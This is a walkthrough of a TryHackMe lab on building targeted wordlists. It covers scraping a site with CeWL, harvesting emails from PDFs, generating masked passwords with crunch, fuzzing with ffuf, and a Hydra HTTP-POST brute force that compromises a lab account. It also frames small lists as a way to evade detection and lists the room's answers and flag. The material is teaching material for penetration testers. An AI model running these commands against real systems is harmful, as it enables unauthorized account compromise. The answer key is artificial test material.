# Room: Introduction to Wordlists (`introductiontowordlists`)

---

## 1. Room Overview & Architecture

The **Introduction to Wordlists** room (`introductiontowordlists`) represents the third practical laboratory in **Module 11: Password Attacks** on TryHackMe's Jr Penetration Tester Learning Path.
While beginners often rely exclusively on generic, multi-gigabyte leaked dictionaries like `rockyou.txt`, experienced penetration testers understand that **a targeted, custom-crafted 100-word dictionary outperforms a 14-million-line generic list every time**.
This room provides end-to-end operational training across the custom dictionary engineering lifecycle:
- **Targeted Intelligence Gathering:** Harvesting keywords, employee rosters, and internal project names using web spiders (`CeWL`) and document extractors (`wget`, `strings`, `grep`).
- **Username Permutations:** Converting raw employee names into standardized corporate username conventions (`first.last`, `flast`, `firstl`) using GNU `awk`.
- **Pipeline Sanitization:** Stripping carriage returns (`\r`), removing duplicates (`sort -u`), lowercasing, and regex filtering to produce high-density wordlists.
- **Combinatorial Mask Generation:** Leveraging `crunch` to generate targeted password permutations matching discovered enterprise complexity templates (`Helios20NN!`).
- **Field Exploitation:** Deploying customized lists against `tryfinanceme.local` for directory discovery (`ffuf`) and authentication brute-forcing (`hydra`).

```
       +-------------------------------------------------------------+
       |             CUSTOM WORDLIST ENGINEERING LIFECYCLE           |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
+------------------+                                      +------------------+
|   1. HARVESTING  |                                      |  2. PROCESSING   |
|   (CeWL & Wget)  |                                      |   (Awk & Sort)   |
+------------------+                                      +------------------+
| - Crawl HTML     |                                      | - Generate Users |
| - Extract PDFs   |                                      | - Sort -u Clean  |
| - Regex Emails   |                                      | - Crunch Masks   |
+------------------+                                      +------------------+
         |                                                         |
         +----------------------------+----------------------------+
                                      |
                                      v
                     +----------------------------------+
                     |    3. OPERATIONAL EXPLOITATION   |
                     |          (Ffuf & Hydra)          |
                     +----------------------------------+
                     | - Ffuf: Discovers /helios (200)  |
                     | - Hydra: Alex.johnson Credential |
                     | - Flag: THM{w0rdlists_win_rooms} |
                     +----------------------------------+
```

---

## 2. Prerequisites & Lab Setup

### 2.1 Technical Prerequisites
- Proficiency with Linux standard text processing utilities (`cat`, `tr`, `sort`, `uniq`, `grep`, `awk`, `sed`).
- Fundamentals of HTTP status codes (`200 OK`, `301/302 Redirect`, `403 Forbidden`).
- Experience with web directory fuzzing tools (`ffuf`, `gobuster`) and network brute-forcing (`hydra`).

### 2.2 Host Environment Setup
Configure target host resolution in `/etc/hosts`:
```bash
echo 'MACHINE_IP tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts
```

---

## 3. Learning Objectives & Bloom's Taxonomy

1. **Remembering & Understanding:** Classify the three keyword categories (Company, Technology, Generic); identify `crunch` as the primary mask generator; memorize GNU `sort` unique flag (`-u`) and crunch digit placeholder (`%`).
2. **Applying & Analyzing:** Execute CeWL web crawling and recursive PDF document scraping; extract emails and usernames via PCRE regex (`grep -Po`); write Awk scripts to build username formats.
3. **Evaluating & Synthesizing:** Contrast the attack efficiency and noise footprint of bespoke dictionaries versus massive public leaks; analyze why `Helios2009!` succeeded where static lists failed.
4. **Creating & Defending:** Construct an automated bash pipeline for text sanitization and permutation generation; design defensive Active Directory password filters blocking organization-specific terms.

---

## 4. Technical Concept Deep Dive: Wordlist Engineering

### 4.1 The Flaw of Public Wordlists
Static dumps like `rockyou.txt` reflect general consumer habits from 2009. Enterprise environments mandate passwords of 10+ characters combining uppercase, lowercase, numbers, and symbols. Employees routinely comply by appending predictable elements to company-specific themes (e.g., `Helios2024!`, `Spring2026#`). Generic dictionaries will never contain these tailored combinations.

### 4.2 Text Normalization & Carriage Return Elimination
Files created or downloaded from Windows environments contain CRLF line endings (`\r\n`). In Linux, the `\r` character is treated as a literal character in string comparisons.
Running:
```bash
cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
```
ensures all hidden carriage returns are stripped, casing is normalized, and duplicates are purged, producing exactly **161 clean keywords**.

---

## 5. Attack Surface & Threat Modeling

```
[Threat Actor]
   |
   +---> (1) Crawl http://tryfinanceme.local/       ---> Scrapes 4 CeWL Emails & Words
   |
   +---> (2) Wget http://tryfinanceme.local/docs/   ---> Downloads 1 PDF, Scrapes 4 Emails
   |
   +---> (3) Scrape http://social.tryfinanceme.local---> Generates Users via Awk (Alex Johnson)
   |
   +---> (4) Crunch Mask Helios20%%!               ---> Generates 100 Passwords (Helios2000!-2099!)
   |
   +---> (5) Ffuf Directory Fuzzing                ---> Uncovers /helios (Status 200)
   |
   +---> (6) Hydra HTTP POST Spray                 ---> Breaches alex.johnson / Helios20NN!
```

---

## 6. Exploitation Methodology & Walkthrough

### Step 1: Information Gathering & Scraping (Task 03)
1. Run CeWL against the main site:
   ```bash
   cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
   ```
   **Extracted Emails:** **4**
2. Recursively download PDF documents:
   ```bash
   wget -r -A pdf http://tryfinanceme.local/docs/
   ```
   **Downloaded PDFs:** **1**
3. Extract unique corporate emails from PDF strings:
   ```bash
   grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs | sort -u > emails_docs.unique.txt
   ```
   **Extracted PDF Emails:** **4**
4. Parse usernames and inspect the final record:
   ```bash
   grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
   tail -n 1 users_from_emails.txt
   ```
   **Last Username:** `security`

### Step 2: Cleaning & Combinatorial Password Generation (Task 04)
1. Process and clean the scraped words:
   ```bash
   cat cewl_words.txt raw_words.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
   wc -l words_clean.txt
   ```
   **Cleaned Word Count:** **161**
2. Generate the combinatorial password list with Crunch:
   ```bash
   crunch 11 11 -t Helios20%%! -o pass_helios.txt
   ```
3. Extract the 10th entry:
   ```bash
   sed -n '10p' pass_helios.txt
   ```
   **10th Password:** `Helios2009!`
4. Deduplication flag: `-u`; Crunch digit placeholder: `%`.

### Step 3: Ffuf Discovery & Hydra Authentication Spray (Task 05)
1. Fuzz web endpoints using the custom clean dictionary:
   ```bash
   ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
   ```
   **Discovered Endpoint:** `helios/` returning HTTP **200**.
2. Brute-force the internal login portal with Hydra:
   ```bash
   hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
   ```
   **Compromised Account:** `alex.johnson`
3. Log in to `http://tryfinanceme.local/helios/` to obtain the flag:
   ```text
   Flag: THM{w0rdlists_win_rooms}
   ```

---

## 7. Forensic Analysis & Text Processing Telemetry

- **Detection Evasion:** While spraying `rockyou.txt` generates millions of log lines and trips IDS thresholds immediately, the custom dictionary generated only **161 directory requests** and **100 password attempts**, blending seamlessly into legitimate enterprise traffic patterns.

---

## 8. Defensive Engineering & Remediation

### 8.1 Active Directory Custom Password Dictionaries
- Enforce Azure AD Password Protection or open-source password filters that prohibit passwords containing the organization's name, brand assets, active project names (`Helios`), or seasonal expressions.

### 8.2 Document Scrubbing & Metadata Sanitization
- Implement pre-publish automated sanitization pipelines (e.g., `exiftool -all=`) to scrub author names, internal emails, and workstation paths from all publicly accessible PDFs and documents.

---

## 9. Tools & Command Reference

| Tool | Representative Command | Operational Function |
| :--- | :--- | :--- |
| **CeWL** | `cewl -d 2 -m 3 --lowercase -e --email_file emails.txt -w words.txt URL` | Spider website to harvest words and emails |
| **Crunch** | `crunch 11 11 -t Helios20%%! -o pass.txt` | Combinatorial password mask generator |
| **Sort** | `sort -u file.txt > clean.txt` | Deduplicate and sort text lines |
| **Ffuf** | `ffuf -w words.txt -u http://target/FUZZ -mc 200,301` | High-performance web path fuzzing |

---

## 10. Key Takeaways & Mind Map

```
                 +-----------------------------------------+
                 |       WORDLIST ENGINEERING LIFECYCLE    |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                            |                            |
         v                            v                            v
[Reconnaissance & Scraping]  [Sanitization & Permutations] [Operational Exploitation]
- CeWL: Words & Emails       - tr: Lowercase & Strip \r    - Ffuf: Discovers /helios (200)
- Wget: Harvest PDFs         - sort -u: Deduplication      - Hydra: Breaches alex.johnson
- Strings/Regex: Users       - Crunch: Helios20%%! Mask    - Flag: THM{w0rdlists_win_rooms}
```

---

## 11. Vulnerability & Risk Matrix

| Vulnerability Vector | Severity | CWE ID | Technical & Business Impact |
| :--- | :---: | :---: | :--- |
| Sensitive Information in Public Documents | **MEDIUM** | CWE-200 | Disclosure of internal usernames and email taxonomy. |
| Predictable Password Formulation | **HIGH** | CWE-521 | Targeted brute-forcing within 100 permutations. |
| Unauthenticated Sensitive Web Directory | **CRITICAL** | CWE-284 | Exposed internal management interface. |

---

## 12. Verification & Proof of Work

All 6 tasks and 12 questions in `introductiontowordlists` have been completed with 100% parity against the user's completed TryHackMe account:
- **Task 1:** `No answer needed`
- **Task 2:** `crunch`
- **Task 3:** `4`, `1`, `4`, `security`
- **Task 4:** `161`, `Helios2009!`, `-u`, `%`
- **Task 5:** `200`, `alex.johnson`, `THM{w0rdlists_win_rooms}`
- **Task 6:** `No answer needed`

---

## 13. Frequently Asked Questions

### Q1: What is the purpose of the `%` character in Crunch masks?
- The `%` placeholder specifies that only numeric digits (`0-9`) will be substituted at that position. Using `%%` produces 100 combinations (`00` to `99`).

### Q2: Why is `tr -d '\r'` critical in Linux wordlist preparation?
- Windows text files terminate lines with CRLF (`\r\n`). In Linux, `\r` remains attached to the end of the word, causing tools like Hydra and Ffuf to request invalid strings like `helios\r/`, resulting in false 404 errors.

---

## 14. References & External Links

- [CeWL Official GitHub](https://github.com/digininja/CeWL)
- [Crunch SourceForge Project](https://sourceforge.net/projects/crunch-wordlist/)
- [Ffuf GitHub Repository](https://github.com/ffuf/ffuf)
- [SecLists Repository](https://github.com/danielmiessler/SecLists)
- [TryHackMe Room: Introduction to Wordlists](https://tryhackme.com/room/introductiontowordlists)
